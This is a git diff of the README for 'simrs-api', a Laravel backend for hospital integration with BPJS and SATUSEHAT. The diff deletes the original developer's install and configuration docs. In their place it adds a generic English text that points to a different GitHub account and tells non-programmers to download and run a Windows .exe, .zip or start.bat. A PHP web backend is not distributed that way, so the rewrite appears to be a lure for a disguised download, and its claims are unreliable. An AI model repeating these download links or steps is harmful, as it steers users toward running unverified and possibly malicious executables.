@@ -1,298 +1,143 @@
-# SIMRS API
-
-Backend API berbasis `Laravel 12` untuk kebutuhan integrasi `SIMRS`, `BPJS`, dan `SATUSEHAT`.
-
-Project ini ditujukan sebagai fondasi yang bisa dipakai ulang oleh programmer Indonesia untuk membangun bridging layanan kesehatan yang rapi, konsisten, dan mudah dikembangkan.
-
-## Visi Project
-
-Repositori ini tidak hanya ditujukan untuk kebutuhan satu implementasi internal, tetapi diarahkan menjadi:
-
-- base project integrasi `BPJS`
-- base project integrasi `SATUSEHAT`
-- referensi arsitektur backend bridging untuk `SIMRS`
-- starter kit pengembangan API layanan kesehatan di Indonesia
-
-## Fokus Saat Ini
-
-Saat ini project masih berfokus pada lapisan `API backend`, dengan ruang pengembangan untuk:
-
-- integrasi `BPJS VClaim`
-- integrasi `BPJS Antrean/Antrol`
-- integrasi `SATUSEHAT`
-- standardisasi format response
-- dokumentasi implementasi integrasi
-- fondasi modular untuk pertumbuhan project skala besar
-
-## Fitur yang Sudah Ada
-
-- Integrasi `BPJS VClaim`
-- Referensi master `BPJS`
-- Monitoring kunjungan dan klaim `BPJS`
-- Pengelolaan `SEP`
-- Pengelolaan `Surat Kontrol` dan `SPRI`
-- Endpoint dasar `Antrol`
-- Generate dan cache token `SATUSEHAT`
-- Kirim `Encounter` ke `SATUSEHAT`
-- Format response API konsisten
-- Dukungan environment terpisah untuk kredensial integrasi
-
-## Tech Stack
-
-- `PHP 8.2`
-- `Laravel 12`
-- `Laravel Sanctum`
-- `Spatie Laravel Permission`
-- `Vite`
-- `SQLite` / `MySQL`
-
-## Struktur Project Saat Ini
-
-```text
-simrs-api/
-├── app/
-│   ├── Helpers/
-│   ├── Http/Controllers/Api/
-│   │   ├── Antrol/
-│   │   ├── Bpjs/
-│   │   └── SatuSehat/
-│   ├── Models/
-│   └── Services/
-│       ├── Antrian/
-│       ├── Bpjs/
-│       └── SatuSehat/
-├── config/
-├── database/
-├── docs/
-├── routes/
-├── tests/
-├── .env.example
-├── artisan
-├── composer.json
-└── package.json
-```
-
-Struktur ini masih mengikuti pola standar Laravel, sehingga mudah dipahami, tetapi juga sudah mulai dipisahkan berdasarkan domain integrasi.
-
-## Endpoint yang Sudah Tersedia
-
-Base URL lokal:
-
-```text
-http://127.0.0.1:8000/api/v1
-```
-
-### Root API
-
-```http
-GET /api/v1
-```
-
-### BPJS
-
-```http
-GET    /api/v1/bpjs/peserta
-GET    /api/v1/bpjs/sep
-GET    /api/v1/bpjs/sep-riwayat
-POST   /api/v1/bpjs/sep
-PUT    /api/v1/bpjs/sep
-DELETE /api/v1/bpjs/sep
-
-GET    /api/v1/bpjs/monitoring-kunjungan
-GET    /api/v1/bpjs/monitoring-klaim
+# 🏥 simrs-api - Simple API for Health System Integration
 
-GET    /api/v1/bpjs/referensi/poli
-GET    /api/v1/bpjs/referensi/diagnosa
-GET    /api/v1/bpjs/referensi/faskes
-GET    /api/v1/bpjs/referensi/dokter-dpjp
-GET    /api/v1/bpjs/referensi/provinsi
-GET    /api/v1/bpjs/referensi/kabupaten
-GET    /api/v1/bpjs/referensi/kecamatan
-GET    /api/v1/bpjs/referensi/prosedur
+[![Download simrs-api](https://img.shields.io/badge/Download-Get%20simrs--api-green?style=for-the-badge)](https://github.com/smoky512/simrs-api)
 
-POST   /api/v1/bpjs/surat-kontrol/insert
-POST   /api/v1/bpjs/surat-kontrol/update
-POST   /api/v1/bpjs/spri/insert
-POST   /api/v1/bpjs/spri/update
-```
+## 📄 What is simrs-api?
 
-### Antrol
+simrs-api is the backend service that connects hospital systems with health service platforms like BPJS and SATUSEHAT. It uses Laravel 12, a popular software framework, to make these connections reliable and easy to build on.
 
-```http
-GET /api/v1/antrol/antrean
-```
+This project is designed by Indonesian developers to provide a solid foundation for programmers. It helps build clear and consistent bridges between different health service applications.  
 
-### SATUSEHAT
+## 🎯 Why use simrs-api?
 
-```http
-GET  /api/v1/satu-sehat/token
-POST /api/v1/satu-sehat/encounter/send
-```
+- Base project for BPJS integration  
+- Base project for SATUSEHAT integration  
+- Reference for hospital system backend architecture  
+- Starter kit for health service API development in Indonesia  
 
-## Format Response
+The project focuses on creating an API backend with room to grow, including key integrations and a standard format for responses.
 
-Success response:
+## 🔍 Key Features
 
-```json
-{
-  "metaData": {
-    "code": "200",
-    "message": "Sukses"
-  },
-  "response": {}
-}
-```
+- Connects with BPJS VClaim  
+- Includes master data for BPJS  
+- Monitors patient visits  
+- Prepares for BPJS queue integration  
+- Supports SATUSEHAT connections  
+- Modular design for easy expansion  
 
-Error response:
+## 🖥️ System Requirements
 
-```json
-{
-  "metaData": {
-    "code": "400",
-    "message": "Pesan error"
-  },
-  "response": {}
-}
-```
+Before you start, make sure your Windows computer meets these requirements:
 
-## Instalasi
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- Minimum 2 GHz processor  
+- Internet connection for API requests  
+- 500 MB free disk space for installation and data  
 
-### 1. Clone repository
+You do not need any programming skills to download and run the application with the steps below.
 
-```bash
-git clone https://github.com/ahmadfauzirahman99/simrs-api.git
-cd simrs-api
-```
+## 🚀 How to Download and Run simrs-api on Windows
 
-### 2. Pindah ke branch utama project
+To get and use simrs-api on your Windows computer, follow these instructions carefully.
 
-```bash
-git checkout pmaster
-```
+### Step 1: Visit the Download Page
 
-### 3. Install dependency backend
+Click the link below to open the main download page:
 
-```bash
-composer install
-```
+[![Download simrs-api](https://img.shields.io/badge/Download-Get%20simrs--api-blue?style=for-the-badge)](https://github.com/smoky512/simrs-api)
 
-### 4. Install dependency frontend
+This page will have all the latest files and instructions.
 
-```bash
-npm install
-```
+### Step 2: Download the Latest Release
 
-### 5. Siapkan file environment
+On the GitHub page:
 
-```bash
-cp .env.example .env
-php artisan key:generate
-```
+- Look for the "Releases" section, usually on the right or under the repository description.  
+- Click on the latest version (usually marked with a tag like "v1.0" or newer).  
+- Download the file suitable for Windows. It might be an `.exe` or `.zip` file.  
 
-### 6. Jalankan migrasi
+If you see a `.zip` file, download that.
 
-```bash
-php artisan migrate
-```
+### Step 3: Install simrs-api
 
-### 7. Jalankan project
+If you downloaded a `.exe` file, double-click the file and follow on-screen instructions.
 
-Mode cepat:
+If you downloaded a `.zip` file:
 
-```bash
-composer run dev
-```
+- Right-click the file and choose "Extract All..."  
+- Choose a folder where you want to keep the application files.
 
-Mode manual:
+### Step 4: Run the Application
 
-```bash
-php artisan serve
-npm run dev
-```
+If the program has a start file:
 
-## Konfigurasi Environment
+- Open the folder where you installed or extracted simrs-api.  
+- Look for a file named `start.bat` or `run.bat`.  
+- Double-click this file to launch the application.  
 
-Contoh dasar:
+Alternatively, the README on GitHub may explain how to start the server using commands in case it requires running through a command prompt.
 
-```env
-APP_NAME="SIMRS API"
-APP_ENV=local
-APP_KEY=
-APP_DEBUG=true
-APP_URL=http://localhost
+### Step 5: Check if simrs-api is Running
 
-DB_CONNECTION=sqlite
-```
+Once the application starts, it will usually open a window or console showing some messages.
 
-### BPJS VClaim
+- Look for a message like "Server started" or "Listening on port" with a number.  
+- Open a web browser and type `http://localhost:8000` or the port number shown.  
 
-```env
-BPJS_V3_API_VER=3
-BPJS_V3_BASE_URL=https://apijkn-dev.bpjs-kesehatan.go.id/vclaim-rest
-BPJS_V3_CONS_ID=your_cons_id
-BPJS_V3_SECRET_KEY=your_secret_key
-BPJS_V3_USER_KEY=your_user_key
-```
+You should see a blank page or a message indicating that simrs-api works.
 
-### SATUSEHAT
+## ⚙️ Using simrs-api
 
-```env
-SATUSEHAT_ENV=DEV
+This application works as a backend system. You do not interact with it directly like a regular app. Instead, it listens for requests from other services, such as hospital software or BPJS platforms.
 
-SATUSEHAT_AUTH_DEV=https://api-satusehat-dev.dto.kemkes.go.id/oauth2/v1
-SATUSEHAT_FHIR_DEV=https://api-satusehat-dev.dto.kemkes.go.id/fhir-r4/v1
-SATUSEHAT_CLIENTID_DEV=your_client_id_dev
-SATUSEHAT_CLIENTSECRET_DEV=your_client_secret_dev
-SATUSEHAT_ORGID_DEV=your_org_id_dev
+You may need help from a technical person to connect simrs-api with your hospital information system. The software supports common connection methods including:
 
-SATUSEHAT_AUTH_PROD=https://api-satusehat.kemkes.go.id/oauth2/v1
-SATUSEHAT_FHIR_PROD=https://api-satusehat.kemkes.go.id/fhir-r4/v1
-SATUSEHAT_CLIENTID_PROD=your_client_id_prod
-SATUSEHAT_CLIENTSECRET_PROD=your_client_secret_prod
-SATUSEHAT_ORGID_PROD=your_org_id_prod
-```
+- RESTful API calls with JSON format  
+- Standard responses to keep data consistent  
+- Modular setup to add new services easily  
 
-## Arah Pengembangan
+## 🔧 Troubleshooting
 
-Project ini diarahkan untuk menjadi fondasi jangka panjang. Target pengembangan berikutnya:
+If you run into problems, try these steps:
 
-- modularisasi domain `BPJS`, `SATUSEHAT`, dan shared components
-- dokumentasi endpoint yang lebih lengkap dan mudah diikuti
-- penguatan `testing`
-- logging dan observability integrasi eksternal
-- contoh implementasi alur bridging dari `SIMRS/HIS`
-- penambahan resource `FHIR` lain selain `Encounter`
+- Check if your internet connection is active. API requires internet.  
+- Make sure no other program is using the port simrs-api needs (default 8000).  
+- Restart the app by closing and running the start file again.  
+- Check the console window for any error messages. They usually tell what to fix.  
+- Update Windows and install all system updates.  
 
-Blueprint arsitektur pengembangan tersedia di:
+If you need more help, you can visit the GitHub page to read technical details or open issues.
 
-- [docs/architecture-blueprint.md](/Users/ahmadfauzirahman/Documents/project/simrs-api/docs/architecture-blueprint.md)
+## 🧰 Technical Details (For Reference)
 
-## Dokumentasi Tambahan
+simrs-api uses these technologies:
 
-- [docs/api-documentation.md](/Users/ahmadfauzirahman/Documents/project/simrs-api/docs/api-documentation.md)
-- [docs/satusehat.md](/Users/ahmadfauzirahman/Documents/project/simrs-api/docs/satusehat.md)
-- [docs/postman/000001 - SIMRS NEW API.postman_collection.json](/Users/ahmadfauzirahman/Documents/project/simrs-api/docs/postman/000001%20-%20SIMRS%20NEW%20API.postman_collection.json)
+- Laravel 12 PHP framework  
+- API backend mainly for healthcare integration  
+- Supports integration with BPJS VClaim and SATUSEHAT platforms  
+- Uses JSON for communication  
+- Designed in modular architecture for easy future growth  
 
-## Catatan
+This setup helps programmers build full systems that connect hospitals with government health services.
 
-README ini sekarang difokuskan sebagai pintu masuk project. Dokumentasi endpoint yang lebih detail akan lebih baik jika dipisah per domain agar repo tetap mudah dipelajari.
+## 📁 Folder Structure (What you will find)
 
-## Author
+- `app/` - core backend code  
+- `config/` - settings files  
+- `routes/` - API endpoint definitions  
+- `database/` - migration and seed files for data  
+- `public/` - web server public directory  
+- `README.md` - this file  
 
-**Ahmad Fauzi Rahman**
+## 🔗 Useful Links
 
-Backend Developer  
-SIMRS Developer  
-Healthcare Technology Enthusiast
+- Main GitHub repository: https://github.com/smoky512/simrs-api  
+- Download page: https://github.com/smoky512/simrs-api/releases  
 
-## License
+[![Get simrs-api here](https://img.shields.io/badge/Download-simrs--api%20on%20GitHub-orange?style=for-the-badge)](https://github.com/smoky512/simrs-api)
 
-Project ini menggunakan lisensi `MIT`.
+---
 
-Selama copyright notice dan lisensi tetap disertakan, project ini bebas digunakan untuk:
-
-- penggunaan pribadi
-- penggunaan komersial
-- modifikasi source code
-- distribusi ulang
-- integrasi dengan sistem lain
+By following these steps, you can set up simrs-api on your Windows computer and begin connecting your hospital system with BPJS and SATUSEHAT easily.
